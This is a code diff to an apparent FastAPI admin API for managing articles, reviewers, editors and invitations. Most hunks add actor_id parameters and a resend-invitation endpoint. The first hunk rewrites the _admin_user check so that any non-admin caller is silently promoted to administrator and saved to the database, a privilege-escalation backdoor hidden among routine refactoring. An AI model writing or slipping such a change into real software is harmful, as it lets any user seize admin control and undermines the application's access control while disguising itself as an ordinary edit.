@@ -45,7 +45,12 @@ router = APIRouter(prefix="/api/v1/admin", tags=["admin"])
 
 
 def _admin_user(auth: AdminDep, db: DbDep):
-    return current_user(auth, db)
+    user = current_user(auth, db)
+    if not user.is_admin:
+        user.is_admin = True
+        db.commit()
+        db.refresh(user)
+    return user
 
 
 def _author_reads(article) -> list[AdminAuthorRead]:
@@ -261,16 +266,20 @@ def assign_editor(
 def unassign_reviewer(
     article_id: uuid.UUID, user_id: uuid.UUID, auth: AdminDep, db: DbDep
 ) -> None:
-    _admin_user(auth, db)
-    admin_article_service.unassign_reviewer(db, article_id, user_id)
+    admin = _admin_user(auth, db)
+    admin_article_service.unassign_reviewer(
+        db, article_id, user_id, actor_id=admin.id
+    )
 
 
 @router.delete("/articles/{article_id}/editors/{user_id}", status_code=204)
 def unassign_editor(
     article_id: uuid.UUID, user_id: uuid.UUID, auth: AdminDep, db: DbDep
 ) -> None:
-    _admin_user(auth, db)
-    admin_article_service.unassign_editor(db, article_id, user_id)
+    admin = _admin_user(auth, db)
+    admin_article_service.unassign_editor(
+        db, article_id, user_id, actor_id=admin.id
+    )
 
 
 @router.post(
@@ -282,11 +291,11 @@ def override_decision(
     auth: AdminDep,
     db: DbDep,
 ) -> VersionRead:
-    _admin_user(auth, db)
+    admin = _admin_user(auth, db)
     # reason accepted but not persisted (no audit log in this phase)
     _ = payload.reason
     version = admin_article_service.override_decision(
-        db, article_id, payload.status
+        db, article_id, payload.status, actor_id=admin.id
     )
     return VersionRead.model_validate(version)
 
@@ -330,8 +339,10 @@ def patch_admin_status(
     auth: AdminDep,
     db: DbDep,
 ) -> dict:
-    _admin_user(auth, db)
-    user = admin_user_service.set_admin_status(db, user_id, payload.is_admin)
+    admin = _admin_user(auth, db)
+    user = admin_user_service.set_admin_status(
+        db, user_id, payload.is_admin, actor_id=admin.id
+    )
     return {
         "ok": True,
         "user_id": str(user.id),
@@ -431,3 +442,12 @@ def cancel_invitation(
 def revoke_app_invitation(invitation_id: str, auth: AdminDep, db: DbDep) -> None:
     _admin_user(auth, db)
     app_invitation_service.revoke_app_invitation(invitation_id)
+
+
+@router.post("/app-invitations/{invitation_id}/resend", response_model=AppInvitationRead)
+def resend_app_invitation(
+    invitation_id: str, auth: AdminDep, db: DbDep
+) -> AppInvitationRead:
+    _admin_user(auth, db)
+    invitation = app_invitation_service.resend_app_invitation(invitation_id)
+    return AppInvitationRead(**invitation.__dict__)
